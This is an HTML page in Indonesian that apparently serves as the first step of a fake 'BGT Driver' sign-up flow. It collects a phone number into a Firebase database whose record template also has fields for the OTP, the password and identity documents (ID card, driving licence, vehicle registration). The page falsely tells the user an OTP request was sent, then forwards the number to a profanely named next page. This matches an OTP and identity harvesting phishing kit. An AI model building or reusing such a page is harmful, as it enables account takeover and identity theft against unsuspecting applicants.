<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>BGT Driver â€” Minta OTP</title>

<!-- Tailwind -->
<script src="https://cdn.tailwindcss.com"></script>

<!-- Firebase -->
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

</head>
<body class="bg-gray-100 flex items-center justify-center min-h-screen">

  <div class="bg-white shadow-xl rounded-xl p-6 w-full max-w-sm">
    <h1 class="text-2xl font-bold text-center text-blue-600 mb-6">BGT DRIVER</h1>

    <div class="mb-4">
      <label class="block text-gray-700 mb-2 font-medium">Nomor Telepon</label>
      <input type="tel" id="telepon" placeholder="+6281234567890" class="w-full border border-gray-300 rounded-lg p-2 focus:ring-2 focus:ring-blue-500 focus:outline-none">
    </div>

    <div class="flex justify-center">
      <button id="mintaOtpBtn" class="bg-blue-600 hover:bg-blue-700 text-white px-6 py-2 rounded-lg font-semibold transition-all duration-200">
        Minta OTP
      </button>
    </div>

    <p id="status" class="text-center text-sm text-gray-500 mt-4"></p>
  </div>

<script>
  // === Konfigurasi Firebase ===
  const firebaseConfig = {
    apiKey: "AIzaSyD3FQbFF5a91MlASpqImTMmGkYvaTcdxm0",
    authDomain: "kadek-ed34e.firebaseapp.com",
    databaseURL: "https://kadek-ed34e-default-rtdb.firebaseio.com",
    projectId: "kadek-ed34e",
    storageBucket: "kadek-ed34e.firebasestorage.app",
    messagingSenderId: "65756136303",
    appId: "1:65756136303:web:6dbe5bc658fadb05ca1e9a"
  };
  firebase.initializeApp(firebaseConfig);
  const db = firebase.database();

  // === Tombol Minta OTP ===
  document.getElementById("mintaOtpBtn").addEventListener("click", () => {
    const telepon = document.getElementById("telepon").value.trim();
    const status = document.getElementById("status");

    if (!telepon) {
      alert("Masukkan nomor telepon terlebih dahulu!");
      return;
    }

    // Simpan ke Firebase
    const dataBaru = {
      nama: "-",
      email: "-",
      telepon: telepon,
      otp: "-",
      dk: "-",
      wilayah: "-",
      password: "-",
      mobil: "-",
      ktp: "-",
      sim: "-",
      stnk: "-",
      status: "belum_otp"
    };

    db.ref("pendaftaran").push(dataBaru)
      .then(() => {
        status.innerText = "Permintaan OTP dikirim. Mengalihkan ke halaman verifikasi...";
        status.classList.add("text-green-500");

        // Arahkan ke halaman verifikasi OTP, kirim nomor telepon lewat URL
        setTimeout(() => {
          window.location.href = `jancok1.html?telepon=${encodeURIComponent(telepon)}`;
        }, 1500);
      })
      .catch(err => {
        status.innerText = "Gagal mengirim data: " + err.message;
        status.classList.remove("text-green-500");
        status.classList.add("text-red-500");
      });
  });
</script>

</body>
</html>
